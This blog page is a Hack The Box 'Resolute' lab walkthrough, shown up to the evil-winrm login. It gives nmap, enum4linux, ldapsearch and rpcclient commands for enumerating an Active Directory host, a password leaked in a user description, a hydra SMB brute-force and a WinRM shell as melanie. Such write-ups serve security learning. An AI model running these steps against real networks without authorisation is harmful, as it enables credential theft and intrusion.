<!DOCTYPE html>
<html lang="en">
  <head>
    <title>
        Hackthebox - Resolute Writeup - A personal cybersecurity blog
      </title>
        <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
    <meta name="renderer" content="webkit">
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta http-equiv="Cache-Control" content="no-siteapp" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    
    <meta name="theme-color" content="#000000" />
    <meta http-equiv="window-target" content="_top" />
    
    
    <meta name="description" content="A medium hard box exploited through ldap. Privilege escalation using DLL injection with the user in DNS Admins group and exploiting the DNS service. Post contains some extra info about ldapsearch, rpcclient, nmap-scripts." />
    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
    <title>Hackthebox - Resolute Writeup - A personal cybersecurity blog</title>
    
    
    <link rel="stylesheet" href="/css/style.min.9167e464480f2f7ea5d94b21496c23d7754ad83cf80376bd5fcb8f7988c7a508.css">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
    <meta property="og:title" content="Hackthebox - Resolute Writeup" />
<meta property="og:description" content="A medium hard box exploited through ldap. Privilege escalation using DLL injection with the user in DNS Admins group and exploiting the DNS service. Post contains some extra info about ldapsearch, rpcclient, nmap-scripts." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" />
<meta property="og:image" content="/shortcode" />
<meta property="og:image" content="/" />
<meta property="article:published_time" content="2020-05-29T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-05-29T00:00:00+00:00" />

<meta itemprop="name" content="Hackthebox - Resolute Writeup">
<meta itemprop="description" content="A medium hard box exploited through ldap. Privilege escalation using DLL injection with the user in DNS Admins group and exploiting the DNS service. Post contains some extra info about ldapsearch, rpcclient, nmap-scripts.">
<meta itemprop="datePublished" content="2020-05-29T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2020-05-29T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="1230">
<meta itemprop="image" content="/shortcode">
<meta itemprop="image" content="/">



<meta itemprop="keywords" content="ldap,ldapsearch,rpcclient,dll injection,dnsadmins,dns,evil-winrm,hydra," /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/shortcode"/>

<meta name="twitter:title" content="Hackthebox - Resolute Writeup"/>
<meta name="twitter:description" content="A medium hard box exploited through ldap. Privilege escalation using DLL injection with the user in DNS Admins group and exploiting the DNS service. Post contains some extra info about ldapsearch, rpcclient, nmap-scripts."/>

    <!--[if lte IE 9]>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
      <![endif]-->

    <!--[if lt IE 9]>
        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
      <![endif]-->

  </head>

  
  

  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="slimContent">
      <div class="navbar-header">
        <div class="profile-block text-center">
          <a id="avatar" href="/">
            <img class="img-circle img-rotate" src="/avatar.png" width="200" height="200">
          </a>
          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
        </div><div class="search" id="search-form-wrap">
    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="Search" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
                        class="icon icon-search"></i></button>
            </span>
        </div>
        <div class="ins-search">
            <div class="ins-search-mask"></div>
            <div class="ins-search-container">
                <div class="ins-input-wrapper">
                    <input type="text" class="ins-search-input" placeholder="Type something..."
                        x-webkit-speech />
                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
                        aria-label="Close"><span aria-hidden="true">×</span></button>
                </div>
                <div class="ins-section-wrapper">
                    <div class="ins-section-container"></div>
                </div>
            </div>
        </div>
    </form>
</div>

        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      </div>
      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
        <ul class="nav navbar-nav main-nav">
            <li class="menu-item menu-item-home">
                <a href="/">
                    <i class="icon icon-home-fill"></i>
                  <span class="menu-title">Home</span>
                </a>
            </li>
            <li class="menu-item menu-item-archives">
                <a href="/posts/">
                    <i class="icon icon-archives-fill"></i>
                  <span class="menu-title">Posts</span>
                </a>
            </li>
            <li class="menu-item menu-item-books">
                <a href="/categories/">
                    <i class="icon icon-book-fill"></i>
                  <span class="menu-title">Writeups</span>
                </a>
            </li>
            <li class="menu-item menu-item-tags">
                <a href="/tags/">
                    <i class="icon icon-tags"></i>
                  <span class="menu-title">Tags</span>
                </a>
            </li>
            <li class="menu-item menu-item-about">
                <a href="/about/">
                    <i class="icon icon-cup-fill"></i>
                  <span class="menu-title">About</span>
                </a>
            </li>
        </ul>
      </nav>
    </div>
  </header>

<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <div class="widget">
  <h3 class="widget-title"><u> Categories</u></h3>
    <div class="widget-body">
        <ul class="category-list">
            <li class="category-list-item"><a href="/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">5</span></li>
            <li class="category-list-item"><a href="/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">3</span></li>
        </ul>
    </div>
</div>
<div class="widget">
  <h3 class="widget-title"><u> Tags </u></h3>
    <div class="widget-body">
        <ul class="tag-list">
            
            
            <a href="/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/dll-injection/" class="tag-list-link">dll-injection</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">3</span>
            
            
            <a href="/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
            
            
            <a href="/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
            
            
            <a href="/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
            
        </ul>

    </div>
</div>

<div class="widget">
  <h3 class="widget-title"><u> Recent Posts </u></h3>
    <div class="widget-body">
        <ul class="recent-post-list list-unstyled no-thumbnail">
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/" class="title">Hackthebox - Montevarde Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-30</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" class="title">TryHackMe - Year of the Rabbit - Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-21</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/" class="title">TryHackMe - UltraTech Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-16 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-16</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" class="title">TryHackMe - DogCat Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-12 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-12</time>
                    </p>
                </div>
            </li>
        </ul>
    </div>
</div>

  </div>
</aside>

    
    
<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <h4 class="toc-title">Table of Contents</h4>
    <nav id="toc" class="js-toc toc">

    </nav>
  </div>
</aside>

<main class="main" role="main"><div class="content">
  <article id="-" class="article article-type-" itemscope
    itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      <h3 itemprop="name">
  <a
    class="article-title"
    href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/"
    >Hackthebox - Resolute Writeup</a
  >
</h3>

      <div class="article-meta">
        
<span class="article-date">
  <i class="icon icon-calendar-check"></i>&nbsp;
<a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="article-date">
  <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
</a>
</span>
<span class="article-category">
  <i class="icon icon-folder"></i>&nbsp;
  <a class="article-category-link" href="/categories/hackthebox-writeups/"> Hackthebox writeups </a>
</span>  
  <span class="article-tag">
    <i class="icon icon-tags"></i>&nbsp;
    <a class="article-tag-link" href="/tags/ldap/"> ldap </a>
    <a class="article-tag-link" href="/tags/ldapsearch/"> ldapsearch </a>
    <a class="article-tag-link" href="/tags/rpcclient/"> rpcclient </a>
    <a class="article-tag-link" href="/tags/dll-injection/"> dll injection </a>
    <a class="article-tag-link" href="/tags/dnsadmins/"> dnsadmins </a>
    <a class="article-tag-link" href="/tags/dns/"> dns </a>
    <a class="article-tag-link" href="/tags/evil-winrm/"> evil-winrm </a>
    <a class="article-tag-link" href="/tags/hydra/"> hydra </a>
  </span>
<br>
        
        
        
      </div>
    </div>
    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
      <p><img src="/img/htb_resolute/card.png" alt=""></p>
<h1 id="nmap-scan">Nmap Scan</h1>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>export <span style="color:#ef6155">ip</span><span style="color:#5bc4bf">=</span>10.10.10.169
</code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>nmap -sC -sV -sS -oN nmap.put <span style="color:#ef6155">$ip</span>
</code></pre></div><p>Open ports:</p>
<blockquote>
<p>53/tcp   open  domain?<br>
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z)<br>
135/tcp  open  msrpc        Microsoft Windows RPC<br>
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)<br>
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)<br>
464/tcp  open  kpasswd5?<br>
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>
636/tcp  open  tcpwrapped<br>
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank)</p>
</blockquote>
<p><img src="/img/htb_resolute/1.png" alt=""></p>
<p>We see that the server is running windows and has active directory. From the
nmap scripts we fine the domain name and forest name as <strong>&ldquo;megabank.local&rdquo;</strong>.
So we add a host to our /etc/hosts file</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>echo <span style="color:#48b685">&#34;10.10.10.169 megabank.local&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>We also fine that the smb server running allows guest authentication.</p>
<h1 id="enumeration">Enumeration</h1>
<h2 id="active-directory---enum4linux">Active Directory - enum4linux</h2>
<p>We enumerate using enum4linux</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>enum4linux -a <span style="color:#ef6155">$ip</span>
</code></pre></div><p>In the output, we find the following users and groups</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>Group &#39;Schema Admins&#39; (RID: 518) has member: MEGABANK\Administrator
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\DefaultAccount
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ryan
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marko
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sunita
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\abigail
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\marcus
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\sally
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\fred
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\angela
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\felicia
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\gustavo
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\ulf
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\stevie
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claire
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\paulo
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\steve
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annette
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\annika
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\per
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\claude
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\melanie
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\zach
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\simon
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\naoki
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>Group &#39;Domain Admins&#39; (RID: 512) has member: MEGABANK\Administrator
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>Group &#39;Enterprise Admins&#39; (RID: 519) has member: MEGABANK\Administrator
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>Group &#39;Domain Controllers&#39; (RID: 516) has member: MEGABANK\RESOLUTE$
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>Group &#39;Domain Computers&#39; (RID: 515) has member: MEGABANK\MS02$
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>Group &#39;Contractors&#39; (RID: 1103) has member: MEGABANK\ryan
</code></pre></div><p>We also find the password policy if we need to bruteforce</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#5bc4bf">[</span>+<span style="color:#5bc4bf">]</span> Retieved partial password policy with rpcclient:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>Password Complexity: Disabled
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>Minimum Password Length: <span style="color:#f99b15">7</span>
</code></pre></div><p>Having a thorough look at the output of enum4linux, we get</p>
<p><img src="/img/htb_resolute/2.png" alt=""></p>
<p>So a user marko has written a password in the description</p>
<blockquote>
<p>Password: Welcome123!</p>
</blockquote>
<h2 id="active-directory---ldapsearch">Active directory - ldapsearch</h2>
<p>We see that the server is running ldap. We can retrieve the info we found with
enum4linux using ldapsearch as well. First we need the rootds. to get that, we
can use the nmap script <strong>ldap-search</strong> or we can use ldapsearch as well.</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>nmap --script<span style="color:#5bc4bf">=</span>ldap-search -Pn -p <span style="color:#f99b15">389</span> 10.10.10.169
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>ldapsearch -x -h 10.10.10.169 -s base namingcontexts  <span style="color:#776e71"># Cleaner results</span>
</code></pre></div><p>NOTE: -x for simple authentication
-h for host
-s for scope</p>
<p><img src="/img/htb_resolute/11.png" alt=""></p>
<p>We get the root dn:</p>
<blockquote>
<p>DC=megabank,DC=local</p>
</blockquote>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>ldapsearch -x -b <span style="color:#48b685">&#34;dc=megabank, dc=local&#34;</span> -h 10.10.10.169 <span style="color:#776e71"># all scopes</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>ldapsearch -x -b <span style="color:#48b685">&#34;dc=megabank, dc=local&#34;</span> -h 10.10.10.169 -s base <span style="color:#776e71"># base scope</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>ldapsearch -x -b <span style="color:#48b685">&#34;dc=megabank, dc=local&#34;</span> -h 10.10.10.169 -s sub  <span style="color:#776e71"># scope subtree</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span>ldapsearch -x -b <span style="color:#48b685">&#34;cn=users, dc=megabank, dc=local&#34;</span> -h 10.10.10.169
</code></pre></div><ul>
<li>dn = distinguished name</li>
<li>cn = common name</li>
<li>dc = domain component</li>
<li>ou = organizational unit</li>
</ul>
<p>To get a better grasp of ldap namespaces, go <a href="https://www.informit.com/articles/article.aspx?p=101405&amp;seqNum=7">here.</a></p>
<p>Looking through the output, we can find the description of the user marko to
get the password.</p>
<h2 id="active-directory---rpcclient">Active directory - rpcclient</h2>
<p>We can get the users and userinfo using rpcclient NULL authentication</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>rpcclient -U <span style="color:#48b685">&#39;&#39;</span> -I 10.10.10.169 megabank.local
</code></pre></div><p>We can execute the following rpcclient commands</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>rpcclient $&gt; enumdomusers  <span style="color:#776e71"># Get a list of users with their rid</span>
</code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>rpcclient $&gt; queryuser 0x457 <span style="color:#776e71"># get userinfo with rid. user marko here</span>
</code></pre></div><p><img src="/img/htb_resolute/12.png" alt=""></p>
<p>We get the password.</p>
<p>We can look at all the users&rsquo; basic info using</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>rpclient $&gt; querydispinfo
</code></pre></div><h1 id="privilege-escalation---user-melanie">Privilege Escalation - User Melanie</h1>
<h2 id="login-using-found-creds">Login using found creds</h2>
<p>We try logging into the smb server using the found creds but get an
authentication error</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>smbmap -u <span style="color:#48b685">&#34;marko&#34;</span> -p <span style="color:#48b685">&#34;Welcome123!&#34;</span> -H megabank.local
</code></pre></div><h2 id="hydra-user-bruteforce">Hydra user bruteforce</h2>
<p>It seems that the password found is not for the user &ldquo;marko&rdquo;. We found many
other users. We try bruteforcing the found passwords against the users. For
this we create a file &ldquo;user.txt&rdquo; that contains the names of our users. Then we
bruteforce the users using hydra</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>hydra -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f
</code></pre></div><p>We get a hit</p>
<p><img src="/img/htb_resolute/3.png" alt=""></p>
<p>So the password is for the user <strong>melanie</strong></p>
<p>Creds:</p>
<blockquote>
<p>User: melanie<br>
Password: Welcome123!</p>
</blockquote>
<h2 id="getting-a-shell-with-evil-winrm">Getting a shell with evil-winrm</h2>
<p>Using our found creds, we try getting a winrm shell using evil-winrm</p>
<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>evil-winrm -i  megabank.local -u melanie -p Welcome123!
